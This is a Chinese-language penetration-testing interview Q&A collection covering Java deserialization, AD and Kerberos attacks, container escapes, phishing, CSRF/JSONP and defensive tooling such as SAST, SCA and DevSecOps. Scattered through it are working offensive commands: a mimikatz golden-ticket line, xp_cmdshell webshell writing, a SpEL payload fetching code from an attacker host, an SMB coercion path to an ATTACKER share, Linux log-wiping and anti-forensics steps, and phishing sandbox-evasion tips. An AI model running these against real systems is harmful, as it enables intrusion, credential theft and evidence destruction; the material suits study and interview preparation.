4. 加强：配合 `SameSite=Lax/Strict` Cookie、Referer/Origin 校验、Token 一次一用。

</details>

## 70. CC 链中 4 个常用 Transformer 区别
<details>
<summary>点击展开答案</summary>

| Transformer | 作用 | 典型用法 |
|-------------|------|----------|
| `ConstantTransformer` | 返回固定对象/值 | 链首设置为 `Runtime.class` |
| `InvokerTransformer`  | 反射调用指定方法 | `newTransformer`、`exec` 等 |
| `ChainedTransformer`  | 顺序执行一组 Transformer | 把多步操作串成一条链 |
| `InstantiateTransformer` | 反射构造新实例 | 生成 `ProcessBuilder("cmd")` |

组合方式：`Chained(Constant → Invoker → Instantiate …)` 构成最终执行链。

</details>

## 71. Fastjson 与 Jackson 反序列化漏洞原理
<details>
<summary>点击展开答案</summary>

* **Fastjson**：`@type` 字段触发 AutoType 机制 → `Class.forName()`
  * 老版本默认开启；
  * 绕过方式：黑名单绕过、BeanToArray、兼容缓存。
* **Jackson**：开启 `enableDefaultTyping()` 后，`"@class"` 指定类型 → `ClassLoader.loadClass()`；
  * 影响库：`com.fasterxml.jackson.databind.ObjectMapper` 在某些框架(Shiro、Spring Cloud)默认打开；
  * 需依赖可利用 Gadget (`JdbcRowSetImpl`, `TemplatesImpl`).

本质相同：**多态反序列化 + 不受限的类加载**。

</details>

## 72. JEP-290 的安全机制
<details>
<summary>点击展开答案</summary>

* Java 8u121 / 7u131 引入的 **Serialization Filtering**。
* 在 `ObjectInputStream` 读取前，按 **白名单/黑名单/大小/深度** 过滤类：
  ```java
  jdk.serialFilter="maxbytes=1048576;maxdepth=20;!*;com.example.safe.*;java.base/*"
  ```
* 可通过：
  1. JVM 参数 `-Djava.security.properties`；
  2. 代码 `ObjectInputFilter.Config.setSerialFilter(filter)`；
  3. `META-INF/services` SPI。
* 阻断大部分 CC 链，但需开发者主动配置，很多老项目仍空缺。

</details>

## 73. RMI 原理与常见漏洞
<details>
<summary>点击展开答案</summary>

* **工作流**：客户端在 `rmiregistry` 查找 Stub → 走 JRMP/TCP 调用远程对象方法 → 参数 & 返回值使用 Java 序列化。
* **漏洞面**：
  1. **未授权访问**：任意客户端可调用敏感方法。
  2. **反序列化 RCE**：`UnicastRef.invoke` 直接 `readObject()` 对入参反序列化 → CC 链。
  3. **Codebase Loading**：老版本允许从远程 HTTP 下载类（`java.rmi.server.codebase`）。
* **典型 CVE**：CVE-2016-4380、CVE-2019-2684；以及 `JRMPListener` 利用链。
* **加固**：关闭远程 Codebase (`-Djava.rmi.server.useCodebaseOnly=true`)、JEP-290 过滤、Registry 绑定白名单。

</details>

## 74. 非对称加密的基本加密/解密流程
<details>
<summary>点击展开答案</summary>

1. **密钥生成**：算法产生公钥 `Kpub` 与私钥 `Kpri`。
2. **加密**：发送方用接收者 `Kpub` 加密明文 → 密文 `C`。
3. **解密**：接收者用自己 `Kpri` 解密 `C` 得到明文。
4. **数字签名**：发送方用 **私钥** 对消息摘要签名；验证方用 **公钥** 校验签名。
5. **混合加密**：实际 TLS/PGP 中，用非对称传输随机对称密钥，再用对称算法加数据，兼顾速度与安全。

</details>

## 75. 常见的非对称加密算法
<details>
<summary>点击展开答案</summary>

* **RSA** 最经典，基于大整数分解困难。
* **DSA** 数字签名算法，美国 NIST 标准。
* **Diffie-Hellman (DH)** 密钥交换协议。
* **ElGamal** 离散对数，OpenPGP 默认。
* **ECC / ECDSA / ECDH** 椭圆曲线族，密钥短、性能好：`secp256r1`, `Curve25519`。
* **Ed25519 / Ed448** 现代高性能签名算法。
* **SM2/SM9** 国产椭圆曲线标准。

</details> 
## 70. 智能合约的鉴权、公私密钥相关等说说
<details>
<summary>点击展开答案</summary>

1. 账户模型
   * **EOA(Externally Owned Account)**：由椭圆曲线私钥控制，签名后通过 `ecrecover` 还原公钥→地址完成鉴权。
   * **合约账户**：代码 + 状态，无私钥；执行 `require(msg.sender==…)` 等逻辑完成授权。
2. 常见鉴权模式
   * **单签名**：默认 `msg.sender` 校验；适合个人钱包。
   * **多签名/门限签名**：如 Gnosis Safe，通过 `M-of-N` 多把私钥协同签名；DAO 常用。
   * **角色-基 (RBAC)**：`onlyOwner`、`onlyRole("ADMIN")`(OpenZeppelin AccessControl)。
   * **时间锁 / 延迟队列**：TimelockController 防治理攻击。
   * **去中心化身份 (DID)**：ENS / ERC-4337 账户抽象，签名链外消息后由 EntryPoint 验证。
3. 密钥与签名
   * ECC(secp256k1) 私钥 → 公钥 → 地址(`keccak256`)；签名算法 ECDSA / Schnorr(BIP-340)。
   * 交易哈希 `Keccak256(RLP(tx))` → `sig(v,r,s)`；链上 `ecrecover` 验证。
4. 攻击面
   * 私钥泄露(低熵、存储不当)。
   * 重放攻击(链 ID 引入 EIP-155)。
   * 签名前缀绕过(EIP-191标准化 `\x19Ethereum Signed Message:`)。
5. 防护
   * 硬件钱包 / 多签 / MPC 保存私钥。
   * 合约端使用 OpenZeppelin 模板、开启 `upgradeDelay`。
   * 监控链上 Owner 变更、Event 告警。

</details>

## 71. 数字钱包的身份认证等等说说
<details>
<summary>点击展开答案</summary>

1. **私钥来源**
   * 随机 256bit → BIP-32 派生 HD Tree(`m/44' /60' /0' /0/i`)。
   * 助记词(BIP-39) 12/24 词 + 可选 passphrase。
2. **钱包类型**
   | 类型 | 鉴权形态 | 特点 |
   |------|---------|------|
   | 熱錢包(App/浏览器扩展) | OS 生物识别 + Keystore(AES+密码) | 便捷、暴露网络风险 |
   | 硬件钱包 | MCU + Secure Element + PIN | 私钥离线、抗物理提取 |
   | 多签钱包 | N 私钥门限 | 企业/DAO 常用，高可用 |
   | MPC 钱包 | 阈值密码学，无单点私钥 | Web2 体验，服务器协助 |
3. **身份认证链路**
   1) 本地解锁—>密码/PIN/生物→ 解密 Keystore/SE 取私钥分片。
   2) 生成交易→私钥签名→钱包注入签名字段。
   3) RPC 广播到节点。
4. **安全强化**
   * 强制密码复杂度、PBKDF2/Scrypt 派生。
   * Anti-phishing 词、域名绑定。
   * EIP-712 结构化签名防钓鱼。
   * 2FA + 交易白名单 / 日限额。
5. **风险点**
   * 助记词截屏/云同步。
   * 伪装 DApp `eth_sign` 钓鱼。
   * 恶意浏览器插件侧录。

</details>

## 72. 数据安全相关，安全架构相关，如何保障数据安全等说说
<details>
<summary>点击展开答案</summary>

分层安全架构：
1. **数据生命周期**：生成→存储(at-rest)→使用(in-use)→传输(in-transit)→销毁。
2. **核心措施**
   * 分类分级：P0-P3，不同加密/审计策略。
   * 加密
     * At-rest：磁盘全盘加密、TDE、列级加密；密钥托管于 HSM/KMS。
     * In-transit：TLS 1.3、mTLS、IPSec。
     * In-use：TEE/SM4 白盒、Homomorphic 加密。
   * 访问控制：IAM、RBAC/ABAC、Zero-Trust、Just-in-Time Privilege。
   * 数据脱敏：掩码、Tokenization、分段存储。
   * DLP：文件指纹、OCR、水印、行为分析。
   * 可审计性：中央日志、区块链不可篡改、双重存证。
   * 备份与灾备：3-2-1 策略、异地多活、定期演练。
3. **安全治理**
   * SDLC：Threat Modeling、SAST/DAST、DevSecOps。
   * 合规：GDPR、PIPL、ISO/IEC 27001、等保 2.0。
   * 安全运营：UEBA、SOAR、蜜罐、红蓝对抗。

</details>

## 73. ysoserial 原理 commoncollections 利用链的原理
<details>
<summary>点击展开答案</summary>

`ysoserial` 是一个 **利用链生成器**，自动拼装常见 Java 库的 Gadget，输出序列化字节流。

1. **总体流程**
   1) 选择模板链(CC1/CC2/CC3…)。
   2) 将命令封装进 `Transformer`、`TemplatesImpl` 或 `Runtime.exec` 调用。
   3) 反射构造对象图→`ObjectOutputStream`→payload。
2. **CC1 细节**
   ```text
   AnnotationInvocationHandler.readObject → HashMap.hashCode
     → LazyMap.get → ChainedTransformer.transform
       ConstantTransformer(Runtime.class)
       InvokerTransformer(getMethod)
       InvokerTransformer(invoke)
       ConstantTransformer(cmdArray)
       InvokerTransformer(exec)
   ```
   * 触发点：`hashCode()` during `HashMap` deserialisation。
   * 关键：`InvokerTransformer` 反射调用任意方法。
3. **CC2**
   *入口*: `HashMap.readObject` → `TiedMapEntry.hashCode`。
   *链*: `LazyMap.get` + `TemplatesImpl.newTransformer()` → 字节码执行。
4. **CC3**
   *入口*: `PriorityQueue.readObject`。
   *链*: `TransformingComparator.compare` → `InvokerTransformer`。
5. **共同点**
   * 利用 `*Transformer` 延迟执行。
   * 依赖无补丁版本 Commons-Collections <3.2.2 / <4.1。

</details>

## 74. 内网一台机器，只有一个 mssql 的服务账户权限，如何进行后续的利用
<details>
<summary>点击展开答案</summary>

1. **枚举环境**
   * `xp_msver`, `@@version` → 补丁、架构。
   * `select SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')`。
   * `EXEC xp_cmdshell 'whoami'` 测试是否开放。
2. **提权路径**
   | 手法 | 前置 | 说明 |
   |------|------|------|
   | `xp_cmdshell` | sysadmin | 调用 OS；若关闭可 `sp_configure` 打开需高级权限。 |
   | CLR Assembly | `CREATE ASSEMBLY` | 上传 C# DLL → `Process.Start`。 |
   | 代理作业 | `SQLAgentOperatorRole` | 创建 CmdExec Job 即 SYSTEM。 |
   | 可信路径写文件 | 拥有 `UNC write` 权限 | `bcp` 导出 → DLL 劫持、计划任务。 |
3. **横向移动**
   * `xp_dirtree '\\ATTACKER\share'` 诱导 DC 认证做 **SMB Relaying**。
   * 利用 **Linked Server**：`EXEC('...') AT [REMOTE]`。
4. **凭据获取**
   * `SELECT password_hash FROM sys.sql_logins` 暴力破解其他 SQL 登录。
   * `EXEC xp_regread` 读取服务启动账号明文。(早期版本)
5. **出网受限时**
   * 写 WebShell 至 IIS 路径(`xp_cmdshell echo ^<%...%^> > inetpub\wwwroot\shell.aspx`)。
   * 利用 MS-DTM、ICMP 隧道。

</details>

## 75. k8s 和 docker 如何去做攻击 有哪些利用方式 是什么原因导致的
<details>
<summary>点击展开答案</summary>

1. **Docker 维度**
   * 未授权 Docker API(`tcp://0.0.0.0:2375`) → `docker run -v /:/host --privileged alpine chroot /host` 逃逸。
   * 特权容器 `--privileged` / `cap_add=SYS_ADMIN` / `hostPID` → 挂载 `/proc` 泄露宿主。
   * 映像供应链：恶意 `ENTRYPOINT`, 钓鱼镜像 → CI/CD 污染。
2. **Kubernetes 维度**
   | 层级 | 典型攻击 | 原因 |
   |------|---------|------|
   | API Server | 未认证端口 `/api/v1/namespaces` | `--anonymous-auth=true` 默认开启早期版本 |
   | RBAC 提权 | ServiceAccount token 拿到 `cluster-admin` | 过度授权、默认 `automount` |
   | Kubelet | `10250` 未认证 `exec/` | 关闭 TLS 或未启用认证 |
   | etcd | 2379 明文存储 Secrets | 未加密、无 ACL |
   | 网络 | ARP/MAC Flood、CNI 插件逃逸 | 扁平网络、缺乏微隔离 |
3. **容器逃逸手段**
   * `cgroups v1 release_agent`、`/proc/sys/kernel/core_pattern` 覆写。
   * 内核漏洞：DirtyPipe、cve-2022-0185 OverlayFS。
4. **防护措施**
   * 最小权限 RBAC、禁用匿名、NetworkPolicy。
   * `PodSecurityContext`：禁 root、NoPrivilegeEscalation。
   * 镜像签名 Cosign、AdmissionWebhook 扫描。

</details>

## 76. 如何删除 linux 机器的入侵痕迹
<details>
<summary>点击展开答案</summary>

1. **日志清理**
   * `> /var/log/{secure,messages,btmp,wtmp,lastlog}` 或者 `sed -i '/attackerIP/d' /var/log/*`。
   * `journalctl --flush && rm -rf /var/log/journal/*`。
2. **历史记录**
   * `history -c && export HISTFILE=/dev/null`；删除 `~/.bash_history`、`~/.zsh_history`。
3. **计划任务/残留文件**
   * `crontab -r`、`rm /etc/cron*/*attacker*`。
   * 删除上传工具、免密 key(`~/.ssh/authorized_keys`)。
4. **时间戳伪造**
   * `touch -t 202001010101 /path/file`；`TZ` 伪装。
5. **进程/端口隐藏**
   * LD路径注入或加载 LKM Rootkit(`hide_ps`, `hide_tcp`)。

⚠️ 完全擦除难以对抗集中日志/EDR，且违法；生产环境请遵守取证流程。

</details>

## 77. NTLM relay 原理
<details>
<summary>点击展开答案</summary>

1. **流程**
   1) 攻击者伪装服务器接收 NTLM Type-1→返回 Type-2 challenge。
   2) 同时把受害者的 Type-1/2 过程中继到目标服务(SMB/LDAP/HTTP)。
   3) 目标服务返回验签通过即完成认证，攻击者获得受害者身份的会话。
2. **核心条件**
   * 目标服务与受害者位于同一网络，且未启用 **SMB/LDAP Signing 或 EPA**。
   * 无 MIC(消息完整性) 校验导致可替换 challenge。
3. **常见利用**
   * `impacket/ntlmrelayx.py -t ldap://dc --escalate-user user` → 自动添加域控管理员。
   * SMB → 写入 GPO、远程执行。
4. **防御**
   * 强制签名(`RequireSigning`)，启用 `Extended Protection`。
   * 禁用 NTLM、使用 Kerberos + channel binding。

</details>

## 78. 金票据原理，黄金票据在 kerberos 的哪个阶段？如何制作？用哪个用户的 hash 来制作？
<details>
<summary>点击展开答案</summary>

* **定义**：伪造域控签发的 TGT(krbtgt 账户密钥) → 任意身份、任意有效期。
* **阶段**：Kerberos AS 阶段(TGT 由 KDC 返回)。攻击者绕过 KDC，直接本地生成假 TGT 并注入内存—>以后与 TGS 交互正常。
* **制作条件**
  1) 拿到 **krbtgt** 帐号 NTLM/hash(或 AES key)。
  2) 域 SID、目标用户名、RID。
* **工具**
   ```bash
   mimikatz "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:NTLMHASH /ptt"
   ```
* **效果**：票据加载后即可 `psexec \\dc cmd`，大小写组任意，默认 10 年。

</details>

## 79. spring spel 漏洞原理&利用方法 什么情况才能利用
<details>
<summary>点击展开答案</summary>

1. **SpEL 简介**：Spring Expression Language，可在 `@Value`, `#{}` 动态解析。
2. **注入场景**
   * 用户可控数据传入 `ExpressionParser.parseExpression()` 或 `BeanWrapper.setPropertyValue()`。
   * 常见漏洞点：`Spring Data REST` `sort=`、`SpELView`、`Spring Cloud Gateway CVE-2022-22947` 过滤器配置。
3. **利用链**
   * `T(java.lang.Runtime).getRuntime().exec('cmd')`。
   * `new java.net.URL('http://attacker/x').openStream()` 下载马。
4. **触发条件**
   | 必要条件 | 说明 |
   |----------|------|
   | 输入可控且未经 `setVariable` 白名单 | 完整表达式执行权限 |
   | 运行环境允许反射/`exec` | SecManager 无限制 |
5. **防御**
   * `setAllowedClasses`、`StandardTypeLocator` 白名单。
   * 生产环境关闭动态配置接口、升级补丁。

</details>

## 80. tomcat BCEL 如何利用
<details>
<summary>点击展开答案</summary>

1. **原理**：`org.apache.bcel.util.ClassLoader` 遇到类名以 `$$BCEL$$` 开头时会 **Base64 解码 → defineClass → <clinit>**，执行恶意字节码。
2. **前置**
   * 网站允许上传/注入 JSP 源码或 XML 配置中可插入类名。
   * 依赖包中存在 BCEL 或 JDK 内部 `com.sun.org.apache.bcel.internal.util.ClassLoader`(Java 8-)。
3. **利用流程**
   1) 用 `bcel-6.5.0` 生成字节码 `java -jar bcel.jar dump /tmp/Shell.class` → 得到 `$$BCEL$$...` 字符串。
   2) 构造 JSP: `<% Class.forName("$$BCEL$$...",true,this.getClass().getClassLoader()); %>`。
   3) 上传并访问，字节码 `<clinit>` 执行 `Runtime.exec`、内存马注册 Filter。
4. **绕过检测**
   * 使用多段拼接、Unicode 转义混淆 `\u0024\u0024BCEL\u0024\u0024`。
5. **修复**：升级移除 BCEL、开启 `SecurityManager`, WAF 拦截 `$$BCEL$$` 特征。

</details>

## 81. 同源策略是啥，referer检测，前端空referer防御
<details>
<summary>点击展开答案</summary>

1. **同源策略(SOP)**：浏览器只允许协议+域名+端口都一致的脚本读取资源(读限制，写不限制)。
2. **跨域方式**：
   * JSONP：`<script src="api?callback=fn">` 利用 `script` 无跨域限制；仅 GET，存在 XSS/劫持。
   * CORS：服务端回 `Access-Control-Allow-Origin`，可含凭据(`credentials=true`)。
3. **Referer 校验防 CSRF**
   * 服务端取 `Referer`, 判断是否同源。
   * 若浏览器不发送(HTTPS→HTTP, `referrer-policy: no-referrer`)，需降级校验 **CSRF Token**。
4. **构造绕过**
   * `Referer:` 空 → IE/Edge 某些下载场景。
   * 二级域滥用：`evil.example.com` 若白名单 `*.example.com`。
5. **综合防御**
   * 同源+Token 双重校验。
   * `SameSite=Lax|Strict` Cookie。
   * CSP ，禁止 `unsafe-inline` 脚本。

</details>

## 82. jsonp是什么，怎么绕过 劫持问题，防御
<details>
<summary>点击展开答案</summary>

* **JSONP**：旧式跨域方案，后端返回 `callback({...})` 包装的 JS。浏览器执行后把数据交给全局函数。
* **攻击面**
  1) **Callback 参数可控**：`callback=alert` → XSS。
  2) **JSON Hijacking**：敏感 JSONP 可被 `<iframe>` 盗用。
  3) CDNs 劫持、DNS 污染注入恶意脚本。
* **绕过示例**
  * 服务器白名单 `^[a-zA-Z0-9_]+$` 可被 `a.constructor.prototype.alert=1` 等花式参数击穿。
  * Polyglot：`/**/alert(1)//`。
* **防御**
  * 改用 **CORS + token**，弃用 JSONP。
  * 服务端 callback 严格 `^[a-zA-Z_][\w]{0,30}$`，并 `application/javascript` header + CSP。
  * 敏感接口仅允许内部域名访问，或加 `X-Content-Type-Options: nosniff`。

</details>

## 83. pth中LM hash和NTLM hash的区别
<details>
<summary>点击展开答案</summary>

| 对比 | LM Hash | NTLM Hash |
|------|---------|-----------|
| 算法 | DES 拆分 7 字节×2 → 大写 | MD4(Unicode) 单次 | 
| 长度 | 32 hex | 32 hex |
| 区分大小写 | 否(自动大写) | 是 |
| 最大长度 | 14 字符 | 255 字符 |
| 安全性 | 极弱，彩虹表秒破 | 相对更强，但可离线暴力 |
| 默认支持 | XP 及更早，Win7+ 默认禁用 | 仍用于 NTLM/Net-NTLMv2 | 

**Pass-the-Hash** 主要使用 **NTLM**；LM 即使为零也不影响。

</details>

## 84. CDN的绕过方式
<details>
<summary>点击展开答案</summary>

1. **旁路解析**：
   * 子域未接入 CDN：`origin.example.com`、`ftp.`、`mail.`。
   * DNS 历史记录、SecurityTrails、CRT.sh。
2. **IP 泄露路径**
   * **SSL 证书 SAN** / CAA 记录中暴露真实域。
   * **MX/SRV/SMTP** 指向源站。
   * **Favicon 哈希** 搜索 Shodan。
3. **Web 行为探测**
   * 大包 ICMP/MSS → 判断是否存在防护。
   * Host Header 爆破：`curl --resolve realip:80:host`。
4. **应用层**
   * SSRF → 内网 80 端口可见页面即源站。
   * 回源认证弱 → 构造伪造 `X-Forwarded-Host`。
5. **社会工程/运营失误**：DevOps 把源 IP 放在 Github、工单截图。

</details>

## 85. SQL注入的种类，怎么防御SQL注入，业务层面防止SQL注入的方法
<details>
<summary>点击展开答案</summary>

1. **注入类型**
   * 联合查询(报错) ‑ UNION 输出。
   * Boolean 盲注 / Time 盲注。
   * 堆叠查询(批量语句)。
   * Out-of-Band(OOB) / DNS exfil。
   * 宽字节/编码注入、二次注入、逻辑删除注入(json→sql)。
2. **技术防御**
   * **预编译**：`PreparedStatement`, ORM `#{}`。
   * **最小权限**：APP 账户只给 CRUD, 禁 `FILE`, `SUPER`。
   * **输入校验**：白名单、长度、类型。
   * **转义/编码**：`mysqli_real_escape_string` 仅作兜底。
   * **WAF/RASP**：AST 分析 + 执行前拦截。
   * **存储过程**：只暴露固定参数 SP。
3. **业务层面**
   * **数据权限模型**：租户隔离、行级过滤避免 * 任意查询。
   * **审计与灰度**：慢查询&异常查询告警，重放沙箱。
   * **代码评审**：SQL 拼接禁令，CI 阶段扫描(SonarQube、SemGrep)。

</details> 
## 86. 说一下 SAST、DAST、IAST 的优缺点
<details>
<summary>点击展开答案</summary>

**SAST（静态应用安全测试）**  
优点：
1. 早期介入（编码/编译阶段即可运行），修复成本低。
2. 可定位到具体文件-行号，便于开发者快速修改。
3. 与 CI/CD 易集成，支持弱网或离线环境。

缺点：
1. 误报高，需人工复核；对流式/反射代码识别有限。
2. 无运行环境上下文，无法发现鉴权、配置类漏洞。
3. 扫描大工程耗时长，对多语言/微服务需多套规则。

---

**DAST（动态应用安全测试）**  
优点：
1. 黑盒方式，无需源码，语言/框架无关；能检测运行期漏洞（XSS、认证绕过等）。
2. 误报率相对低，可模拟真实攻击路径。
3. 同时可发现 Web 服务器、中间件配置缺陷。

缺点：
1. 需可访问的测试环境；主动探测可能影响数据。
2. 无源码映射，只能给出 URL，定位代码慢。
3. 覆盖率依赖爬虫/测试流量，容易漏扫隐藏接口。

---

**IAST（交互式应用安全测试）**  
优点：
1. 在运行期植入 Agent，结合字节码与请求上下文，准确率高、误报低。
2. 能精确定位到代码片段，同时捕获运行时漏洞。
3. 可持续监控（配合 RASP）并生成实时 SBOM。

缺点：
1. 需在容器/进程内插桩，对兼容性与性能有轻微影响。
2. 价格与部署复杂度高，对非主流语言支持有限。

**总结**：左移阶段用 SAST，灰盒/集成测试阶段用 IAST，准生产/渗透阶段用 DAST，多策略组合可覆盖 90%+ 风险。

</details>

## 87. SCA 是什么，具体该怎么实现？灰盒、白盒分别怎么做？
<details>
<summary>点击展开答案</summary>

SCA（Software Composition Analysis，软件成分分析）专注于第三方组件/开源依赖的安全与合规风险：识别版本、许可证、已知 CVE，输出 SBOM 并给出修复建议。

实现思路：
1. **依赖收集**：解析 `pom.xml`、`package.json`、`requirements.txt` 等获取直接/传递依赖。
2. **指纹生成**：对 jar/npm 包计算哈希或取 groupId:artifactId:version 作唯一键。
3. **漏洞比对**：与 NVD、CNVD、GitHub Security Advisory、OSS Index 等数据库匹配。
4. **许可证检查**：比对 OSI/FSF 许可证，与企业白名单匹配。
5. **输出报告/SBOM**：CycloneDX、SPDX 格式，附升级/替换建议。

灰盒 vs 白盒：
* **灰盒（Agent/运行期）**：在 JVM/进程注入探针，收集 `ClassLoader` 已加载的 jar、反射动态下载的组件，准确度高；还能统计真实调用面（消除未用依赖）。  
  典型工具：Contrast、Snyk Runtime、JFrog Xray-IDE Agent。
* **白盒（构建期/源代码）**：通过 Maven/Gradle 插件或 `npm audit`, `pip-audit` 等解析构建脚本；无需启动程序，CI 阶段即可完成，速度快，可阻断构建。  
  Maven 插件示例：`org.owasp:dependency-check-maven`，Gradle 插件、GitHub Actions 均类似。

最佳实践：CI 里跑白盒 SCA 阻断高危组件，CD/演示环境跑灰盒 Agent 校验运行时拉取的插件、容器镜像层新增包。

</details>

## 88. CodeQL 哪些阶段容易"断"，该如何处理？
<details>
<summary>点击展开答案</summary>

CodeQL 分三大步骤：① 生成数据库（init + autobuild）、② 扫描（analyze）、③ 上传结果。常见"断点"及应对：

| 阶段 | 常见报错 | 处理办法 |
| --- | --- | --- |
| 数据库提取 | *autobuild failed*、依赖解析失败 | 自定义 `build-script`：`mvn clean package -DskipTests` / `gradlew assemble`；或在 `CODEQL_EXTRACTOR_JAVA_BUILD_COMMAND` 指定命令；Mono-repo 划分子目录分别 init。
| 语言不支持 | `no extractor found` | 升级 CLI，确认 `codeql resolve languages` 列表；暂不支持语言需跳过或用 `--db-cluster` 拆分。 |
| 内存/OOM | 大型项目提取时 `Killed` | 在 Actions 里 `-Xmx` 调大，或使用 `--ram 6500`，分模块提取，多机并行。
| 扫描超时 | `analysis timed out after ...` | 精选查询集 `--queries security-extended`, 调整 `--ram`, `--threads`, 或拆小数据库再合并 SARIF。 |
| 上传失败 | `SARIF too large` | 用 `github/codeql-action/upload-sarif` 自动分片，或开启压缩 `CODEQL_ACTION_COMPRESS_SARIF=true`。 |

通用建议：
1. 本地先 `codeql database create --language=<lang>` 试跑，确定脚本 OK。  
2. CI 缓存依赖、使用多 Job Matrix。  
3. 针对多模块 monorepo，用 `CODEQL_MULTI_LANGUAGE` 创建多数据库并 `database merge`。

</details>

## 89. DevSecOps 是啥流程？
<details>
<summary>点击展开答案</summary>

典型闭环模型：
1. **Plan** —— 需求威胁建模，制定安全基线。
2. **Code** —— IDE 插件、预提交钩子 (SAST/Lint/SCA)。
3. **Build** —— CI 阶段：SAST、IaC 扫描、SBOM 生成，违规阻断。
4. **Test** —— 单元/接口测试＋IAST、依赖镜像扫描、Secret 检测。
5. **Release** —— DAST、合规检查、签名制品、策略审批。
6. **Deploy** —— CD 阶段：策略-as-code、Kubernetes Admission、RASP。
7. **Operate** —— 运行态监控（IDS/WAF/RASP）、日志集中、SIEM。
8. **Feedback** —— 异常事件回流 Jira/GitLab Issue，更新威胁模型、规则。

工具集成示例：Jira ↔ GitLab CI ↔ SonarQube/Snyk ↔ Kubernetes ↔ Falco/Prometheus ↔ ELK/Splunk。

核心理念："Security as Code"+"自动化"+"可观测"+"持续改进"。

</details>

## 90. 内网横向中，是直接拿到一台机就全网扫，还是有别的方法？
<details>
<summary>点击展开答案</summary>

高噪声全网扫易触发 EDR/IDS。常用低噪声策略：
1. **资产枚举优先**：
   * 查询 AD：`net group "Domain Computers" /domain`, `Get-NetComputer -Ping`。  
   * 读取 `arp -a`, DHCP lease, DNS 缓存。
2. **凭证收集**：浏览器/内存/注册表/Ntds.dit，优先获取管理员会话。
3. **基于图的路径计算**：BloodHound 分析最短路，定位高价值跳板。
4. **协议特异横移**：IPC$, WMI, WinRM, SMB named-pipe、PSRemote，避免开启端口扫描。
5. **无文件/凭证重用**：Pass-the-Hash/Ticket/Key；远控内存马。
6. **基于业务时间窗口**：利用运维低峰，降低告警。

只有在信息不足时才对目标子网做 **分段/探针式扫描**（如 `-sS -Pn -p445,3389 <ip/24>`），并控制速率 `--min-rate 10`。

</details>

## 91. 钓鱼用什么来钓？文案思路？如何判定出网协议？做一套还是多套？提高成功率方法？
<details>
<summary>点击展开答案</summary>

1. **载荷选择**：
   * Office 宏 / OneNote / LNK / HTA / JS / ISO+shortcut。
   * 链上恶意 URL：Teams 伪装、SharePoint 请求、QR 钓鱼。
2. **文案策略**：
   * 内部邮件流→ 伪装 HR、财务、IT 通知；关键词"系统升级""奖金申报"。
   * 恶意链接域名使用目标常见 SaaS 子域，HTTPS+有效证书。
3. **判断出网协议**：
   * 事前 OSINT：招采文件、招聘 JD 中的"代理上网/蓝盾"等关键词。  
   * 内招样本抓包：前置送一份 harmless 文档，回连 DNSlog，观察 53/80/443/445/8080/9040，确认可用通道。
4. **单模板 vs 多模板**：
   * 多部门/多角色差异化模板，提高 CTR；但核心载荷统一，方便统计。
5. **提高命中率**：
   * 使用短链接 & 跳转链，绕邮箱沙箱；宏延迟执行+VBA Stomping。  
   * 先 AB 小流量测点，再批量推送。
   * TTP 多样：邮件+钓鱼网站+短信/企业微信链路。

</details>

## 92. 钓鱼上线的主机只有普通域用户，抓不到密码但在域内如何利用？
<details>
<summary>点击展开答案</summary>

1. **票据攻击**：
   * Kerberoasting：请求 SPN 票，离线破解服务账号 NTLM。
   * AS-REP Roast：若用户 `Do not require Kerberos pre-auth`。
2. **ACL 漏洞**：Analyze ACL with BloodHound；利用 `WriteOwner/GenericAll` 权限修改组成员或刷新 `msDS-AllowedToActOnBehalfOfOtherIdentity`→ RBCD 横移。
3. **ADCS 利用**：ESC1/ESC8 证书漏洞，申请模板颁发 TGT，生成银票/金票。
4. **本地提权**：漏洞(PrinterNightmare, CVE-2022-26923)、服务可写、UAC bypass。
5. **凭证导出**：LSASS 受保护可用 `comsvcs.dll` MiniDump、Mimikatz sekurlsa::ekeys；如失败改走 DCSync（需要权限）或导出 SYSVOL GPP cPassword。
6. **旁路网段**：ARP table + route 转移，多跳 socks5 + Rubeus s4u。

</details>

## 93. Shiro 反序列化形成原因、利用链及常见 bypass
<details>
<summary>点击展开答案</summary>

**成因**：RememberMe 功能把 `SerializedPrincipal` AES-CBC 加密后放入 Cookie；密钥硬编码或为默认 `kPH+bIxk5D2deZiIxcaaaA==`。攻击者构造恶意序列化对象＋已知 key，服务端解密后直接 `readObject()` ➜ RCE。

**典型链**：`Cookie(RememberMe)` → `org.apache.shiro.mgt.CookieRememberMeManager#convertBytesToPrincipals` → JDK `ObjectInputStream.readObject` → Commons-Collections/Groovy 等 Gadget。

**常用 bypass**：
1. **Cookie 粉碎**：rememberMe 改大小写/插入 0x0b 逃过 WAF。
2. **垃圾字节**：Base64 中插 `!` `.`，Shiro decode 时自动过滤。
3. **分片/多头**：RememberMe1/2 拆分大 payload；Tomcat 自动合并。
4. **二次加壳**：AES 再包一层 RC4/Gzip，WAF 不解码。
5. **Oracle (CVE-2020-1957)**：Padding-Oracle 暴力爆破 key，无需长 cookie。

修复：关闭 RememberMe、替换随机 128bit key、升级至 ≥1.7 并使用 Java SerialFilter。

</details>

## 94. JNDI 的解析流程和原理
<details>
<summary>点击展开答案</summary>

1. **API 调用**：`InitialContext.lookup("ldap://x:1389/obj")`。
2. **Context 解析**：`InitialContext` 按 URL scheme 选 `ContextFactory`（LDAP, RMI, DNS…）。
3. **网络取名**：客户端发送 ASN.1/ JRMP 查询；服务端返回 `Reference` 或 `Object`。
4. **对象重建**：
   * 若返回 `Reference`，JNDI 根据字段 `factory/ classFactoryLocation` 加载 `ObjectFactory`；
   * 旧 JDK (<u191) 可远程 HTTP 下载字节码；高版本需本地存在类。
5. **ObjectFactory#getObjectInstance`** 返回实例，调用端继续使用。

利用点：在 `ObjectFactory` 中放任意代码；或利用本地 Factory（BeanFactory）执行命令，形成 Log4Shell、Spring Cloud 等链。

</details>

## 95. CSRF 原理、绕过方法与修复
<details>
<summary>点击展开答案</summary>

**原理**：浏览器自动携带 Cookie/凭据，攻击者构造跨站请求冒充用户操作（转账/改邮箱）。

**常见绕过**：
1. 站点仅检查 Referer，可通过 `<iframe sandbox>` 、`meta referrer` 置空、`same-origin` Downgrade 绕过。
2. Token 在 GET 参数，攻击者可提前通过 XSS/信息泄露获取。
3. 仅校验验证码而忽视同一 Session 重放。
4. 逻辑缺陷：Token 只校验存在但不比对值；或上传接口未走校验链。

**修复**：
1. 每次请求带随机 **CSRF Token**，保存在 Cookie 之外（隐藏域/自定义头），服务端双重验证。
2. `SameSite=Lax/Strict` Cookie，减少自动发送。
3. 对敏感接口检查 Referer/Origin，不允许跨域。
